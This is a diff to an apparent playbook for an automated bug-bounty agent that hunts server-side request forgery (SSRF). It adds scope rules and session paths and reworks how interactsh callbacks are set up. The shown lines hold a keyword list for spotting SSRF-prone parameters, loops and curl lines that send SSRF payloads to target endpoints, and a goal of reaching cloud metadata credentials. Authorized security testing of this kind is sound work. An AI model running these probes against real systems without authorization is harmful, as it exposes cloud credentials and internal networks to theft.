@@ -2,12 +2,16 @@
 
 **Mandate:** Find SSRF with impact. AWS/GCP/Azure metadata theft = instant critical. Internal network pivot = high. Port-only SSRF without data = drop.
 
+> **Scope & rules of engagement:** Before any request, confirm each target URL/host is within the program scope recorded in the session's target config (`kimi-data/Sessions/{slug}/`). Out-of-scope assets discovered during testing (e.g. via recon or redirects) must be excluded. Do not run DoS-class tests unless the program policy explicitly allows them.
+
+**Session layout:** `$SESSION_DIR` = `kimi-data/Sessions/{slug}/`. The app profile lives at `$SESSION_DIR/app-profile.json`, recon artifacts under `$SESSION_DIR/recon/`, and findings under `$SESSION_DIR/findings/`. Pure local scratch may stay in `/tmp`; cross-agent handoff files, evidence, and findings use `$SESSION_DIR`.
+
 ---
 
 ## Application Context (READ BEFORE TESTING)
 
 ```bash
-cat /tmp/app-profile.json | jq '{
+cat $SESSION_DIR/app-profile.json | jq '{
   ssrf_hypothesis: [.high_value_flows[] | select(.agents[] == "SSRFAgent")],
   cloud_provider: .tech_stack.cloud,
   webhooks: [.high_value_flows[] | select(.why_interesting | test("webhook|callback|fetch|import|url"; "i"))]
@@ -34,20 +38,26 @@ cat /tmp/app-profile.json | jq '{
 SSRF_PARAMS="url|uri|link|src|source|dest|destination|redirect|return|next|data|file|path|fetch|load|callback|continue|domain|host|webhook|endpoint|proxy|image|feed|import|export"
 
 # Test each parameter
-cat /tmp/bb-params.txt | grep -iE "$SSRF_PARAMS" | tee /tmp/ssrf-candidates.txt
+# produced by: gau/waymore + unfurl --unique keys (see ReconAgent output)
+cat $SESSION_DIR/recon/params.txt | grep -iE "$SSRF_PARAMS" | tee /tmp/ssrf-candidates.txt
 
 # Headers that can cause SSRF
 # X-Forwarded-For, X-Real-IP, X-Forwarded-Host, Host header injection
 # Referer header, Origin header
 
 # PDF generators, image processors, URL importers
-grep -iE "pdf|screenshot|preview|thumbnail|export|import|convert|render" /tmp/bb-urls.txt
+grep -iE "pdf|screenshot|preview|thumbnail|export|import|convert|render" $SESSION_DIR/recon/urls.txt
 ```
 
 ### 2. Blind SSRF Detection (Burp Collaborator / interactsh)
 ```bash
-# Setup interactsh server
-COLLAB_HOST=$(interactsh-client -n 1 2>/dev/null | head -1)
+# Start the interactsh client — it PRINTS a unique callback domain (e.g. abc123.oast.site)
+# and then keeps polling for interactions. Run it in a separate terminal and copy the
+# printed domain into COLLAB_HOST — that domain is what you embed in SSRF payloads:
+interactsh-client --server https://oast.site
+# (--server only SELECTS the interactsh server: omit it for the public default, or pass
+#  a self-hosted instance URL — never the callback domain itself)
+COLLAB_HOST=abc123.oast.site   # replace with the domain interactsh-client printed
 
 # Test all SSRF candidates
 for ENDPOINT in $(cat /tmp/ssrf-candidates.txt); do
@@ -57,8 +67,9 @@ for ENDPOINT in $(cat /tmp/ssrf-candidates.txt); do
 done
 wait
 
-# Verify callbacks
-interactsh-client --server $COLLAB_HOST --poll-interval 5
+# Verify callbacks — watch the running interactsh-client output for DNS/HTTP
+# interactions at $COLLAB_HOST (a hit from the target confirms blind SSRF)
+# Burp alternative: bun kimi/Tools/burp-bridge.ts --collaborator-poll
 ```
 
 ### 3. Cloud Metadata Endpoints (INSTANT CRITICAL)
@@ -150,6 +161,9 @@ curl -sk "https://$TARGET/fetch?url=$PAYLOAD"
 | SSRF to external URLs only | 4.3 | NO — DROP |
 
 ## Output Format
+
+Write findings to `$SESSION_DIR/findings/ssrf-findings.json` with shape `{"target": ..., "generated_at": ..., "findings": [...]}`, where each entry in `findings` uses this format:
+
 ```json
 {
   "type": "SSRF",
